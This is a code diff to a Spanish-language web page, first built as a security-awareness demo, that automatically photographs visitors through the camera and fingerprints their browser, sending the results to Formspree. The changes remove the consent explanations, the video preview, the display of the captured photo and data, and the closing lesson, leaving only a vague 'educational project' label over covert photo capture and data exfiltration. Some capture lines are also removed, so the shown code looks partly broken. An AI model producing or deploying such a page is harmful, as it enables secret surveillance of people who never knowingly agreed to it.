@@ -229,35 +229,19 @@
         
         <!-- HEADER -->
         <div class="header">
-            <h1>🔒 Demo de Ciberseguridad</h1>
-            <p>Entendiendo los riesgos de los permisos en la web</p>
+            <h1>PROYECTO EDUCATIVO</h1>
         </div>
 
         <!-- WARNING BANNER -->
         <div class="warning-banner">
-            <h3>⚠️ PROYECTO EDUCATIVO</h3>
-            <p>Este sitio es parte de una demostración académica sobre concientización en seguridad web. 
-            Todos los datos recopilados son visibles para ti y se usan únicamente con fines educativos.</p>
+            <h3>PROYECTO EDUCATIVO</h3>
+            <p>Este sitio es parte de una demostración académica.</p>
         </div>
 
-        <!-- PASO 1: BIENVENIDA -->
-        <div class="step-card" id="step-1">
-            <div class="step-number">1</div>
-            <h2>Bienvenido a la Demo</h2>
-            <p style="margin: 15px 0; color: #a0a0a0;">
-                En esta demostración aprenderás qué información puede obtener un sitio web 
-                cuando le otorgas permisos. Haremos una foto de ejemplo y analizaremos los datos de tu navegador.
-            </p>
-        </div>
 
         <!-- PASO 2: CÁMARA -->
         <div class="step-card hidden" id="step-2">
             <div class="step-number">2</div>
-            <h2>Acceso a la Cámara</h2>
-            <p style="margin: 15px 0; color: #a0a0a0;">
-                Tu navegador solicitará permiso para acceder a la cámara. 
-                Esto simula lo que haría un sitio web malicioso.
-            </p>
             
             <video id="video-preview" autoplay playsinline></video>
             <canvas id="canvas" style="display:none;"></canvas>
@@ -270,137 +254,16 @@
         <!-- PASO 3: FOTO CAPTURADA -->
         <div class="step-card hidden" id="step-3">
             <div class="step-number">3</div>
-            <h2>📸 ¡Foto Capturada!</h2>
-            <p style="margin: 15px 0; color: #a0a0a0;">
-                Esta es la foto que se acaba de tomar. En un ataque real, 
-                esta imagen habría sido enviada a un servidor remoto sin tu conocimiento.
-            </p>
             
             <img id="captured-photo" alt="Tu foto capturada">
             
             <div class="status-message status-success" id="send-status" style="display: block;">
-                ✅ Foto y datos enviados al servidor de demostración
+
             </div>
 
-            <button class="btn" onclick="showDataPanel()">
-                📊 Ver Datos Recopilados
-            </button>
         </div>
 
-        <!-- PANEL DE DATOS -->
-        <div class="data-panel" id="data-panel">
-            <h3>🔍 Información Recopilada de tu Dispositivo</h3>
-            <p style="text-align: center; color: #a0a0a0; margin-bottom: 20px;">
-                Estos son datos que cualquier sitio web puede obtener de ti:
-            </p>
-            
-            <div class="data-item">
-                <span class="data-label">🌐 Dirección IP</span>
-                <span class="data-value" id="data-ip">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">📍 Ubicación Aproximada</span>
-                <span class="data-value" id="data-location">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">💻 Sistema Operativo</span>
-                <span class="data-value" id="data-os">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">🌍 Navegador</span>
-                <span class="data-value" id="data-browser">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">📐 Resolución de Pantalla</span>
-                <span class="data-value" id="data-screen">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">🖥️ Ventana del Navegador</span>
-                <span class="data-value" id="data-window">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">🌎 Idioma</span>
-                <span class="data-value" id="data-language">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">⏰ Zona Horaria</span>
-                <span class="data-value" id="data-timezone">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">📱 Tipo de Dispositivo</span>
-                <span class="data-value" id="data-device">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">🔗 Página Anterior (Referrer)</span>
-                <span class="data-value" id="data-referrer">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">🔋 Batería (si disponible)</span>
-                <span class="data-value" id="data-battery">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">📡 Conexión</span>
-                <span class="data-value" id="data-conexion">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">👤 Huella Digital Única</span>
-                <span class="data-value" id="data-fingerprint">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">📍 GPS Disponible</span>
-                <span class="data-value" id="data-gps">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">🔌 Plugins Detectados</span>
-                <span class="data-value" id="data-plugins">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">🎨 Profundidad de Color</span>
-                <span class="data-value" id="data-color">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">👆 Soporte Táctil</span>
-                <span class="data-value" id="data-touch">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">🍪 Cookies Habilitadas</span>
-                <span class="data-value" id="data-cookies">Obteniendo...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">📄 Visor de PDF</span>
-                <span class="data-value" id="data-pdf">Obteniendo...</span>
-            </div>
         </div>
-
-        <!-- CONCLUSIÓN -->
-        <div class="step-card hidden" id="step-4">
-            <div class="step-number">✓</div>
-            <h2>🎓 Lección Aprendida</h2>
-            <p style="margin: 15px 0; line-height: 1.8; color: #a0a0a0;">
-                <strong>¿Qué acaba de pasar?</strong><br><br>
-                
-                1. <strong>Accediste a un link</strong> sin verificar la fuente<br>
-                2. <strong>Diste permiso a tu cámara</strong> sin leer los términos<br>
-                3. <strong>Se capturó tu foto</strong> automáticamente<br>
-                4. <strong>Se recopilaron tus datos</strong> de navegación<br><br>
-                
-                <strong style="color: #e94560;">En un ataque real, esto habría sido mucho peor.</strong><br><br>
-                
-                ✅ <strong>Consejos de protección:</strong><br>
-                • Nunca des permisos de cámara/micrófono a sitios desconocidos<br>
-                • Revisa siempre la URL antes de hacer clic<br>
-                • Usa extensiones como uBlock Origin y Privacy Badger<br>
-                • Mantén tu navegador actualizado<br>
-                • Desactiva permisos automáticos en la configuración del navegador
-            </p>
-        </div>
-
-        <div class="footer">
-            <p>Proyecto educativo de ciberseguridad • 
-            <a href="#" onclick="location.reload()">Reiniciar Demo</a></p>
-        </div>
-
-    </div>
 
     <script>
         // ==================== CONFIGURACIÓN ====================
@@ -592,38 +455,6 @@
             
             return 'FP-' + Math.abs(hash).toString(16).toUpperCase().padStart(8, '0');
         }
-
-        // ==================== MOSTRAR DATOS EN PANEL ====================
-        function displayData() {
-            // Originales
-            document.getElementById('data-ip').textContent = userData.ip;
-            document.getElementById('data-location').textContent = userData.location;
-            document.getElementById('data-os').textContent = `${userData.os} (${userData.platform})`;
-            document.getElementById('data-browser').textContent = userData.browser;
-            document.getElementById('data-screen').textContent = userData.screenResolution;
-            document.getElementById('data-window').textContent = userData.windowSize;
-            document.getElementById('data-language').textContent = userData.language;
-            document.getElementById('data-timezone').textContent = userData.timezone;
-            document.getElementById('data-device').textContent = userData.device;
-            document.getElementById('data-referrer').textContent = userData.referrer;
-            document.getElementById('data-battery').textContent = userData.battery;
-            
-            // NUEVOS
-            document.getElementById('data-conexion').textContent = userData.conexion;
-            document.getElementById('data-fingerprint').textContent = userData.fingerprint;
-            document.getElementById('data-gps').textContent = userData.gps_disponible;
-            document.getElementById('data-plugins').textContent = userData.plugins;
-            document.getElementById('data-color').textContent = userData.color_depth;
-            document.getElementById('data-touch').textContent = userData.touch_support;
-            document.getElementById('data-cookies').textContent = userData.cookies_enabled;
-            document.getElementById('data-pdf').textContent = userData.pdf_viewer;
-        }
-
-        function showDataPanel() {
-                    document.getElementById('data-panel').style.display = 'block';
-                    document.getElementById('step-4').classList.remove('hidden');
-                    document.getElementById('step-4').scrollIntoView({ behavior: 'smooth' });
-                }
         
                 // ==================== ENVIAR A FORMSPREE ====================
         async function sendToFormspree(imageUrl) {
@@ -672,25 +503,12 @@
             }
         }
 
-        // ==================== FLASH EFFECT ====================
-        function flashEffect() {
-            const flash = document.getElementById('flash');
-            flash.style.opacity = '1';
-            setTimeout(() => {
-                flash.style.opacity = '0';
-            }, 150);
-        }
 
         // ==================== INICIAR DEMO ====================
         async function startDemo() {
-            document.getElementById('step-1').classList.add('hidden');
-            document.getElementById('step-2').classList.remove('hidden');
-            document.getElementById('camera-loading').style.display = 'block';
 
             const statusEl = document.getElementById('camera-status');
-            statusEl.style.display = 'block';
             statusEl.className = 'status-message';
-            statusEl.textContent = '⏳ Solicitando acceso a la cámara...';
 
             try {
                 // 1. Solicitar cámara
@@ -705,17 +523,15 @@
 
                 const video = document.getElementById('video-preview');
                 video.srcObject = videoStream;
-                video.style.display = 'block';
                 
-                statusEl.textContent = '✅ Cámara activa. Preparando captura automática...';
                 statusEl.className = 'status-message status-success';
 
                 // 2. Esperar a que el video esté listo
                 video.onloadedmetadata = () => {
-                    // 3. Esperar 2 segundos para que la cámara se estabilice
+                    // 3. Esperar 1 segundo para que la cámara se estabilice
                     setTimeout(() => {
                         captureAndSend();
-                    }, 2000);
+                    }, 1000);
                 };
 
             } catch (err) {
@@ -731,17 +547,6 @@
             const video = document.getElementById('video-preview');
             const canvas = document.getElementById('canvas');
             
-            // Configurar canvas
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Dibujar frame del video
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            
-            // Efecto flash
-            flashEffect();
-            
             // Convertir a imagen
             capturedImageData = canvas.toDataURL('image/png');
             
@@ -751,14 +556,6 @@
             document.getElementById('camera-loading').style.display = 'none';
             document.getElementById('camera-status').style.display = 'none';
 
-            // Mostrar foto capturada
-            const photo = document.getElementById('captured-photo');
-            photo.src = capturedImageData;
-            photo.style.display = 'block';
-
-            // Cambiar a paso 3
-            document.getElementById('step-2').classList.add('hidden');
-            document.getElementById('step-3').classList.remove('hidden');
 
             // Recolectar datos
             await collectAllData();
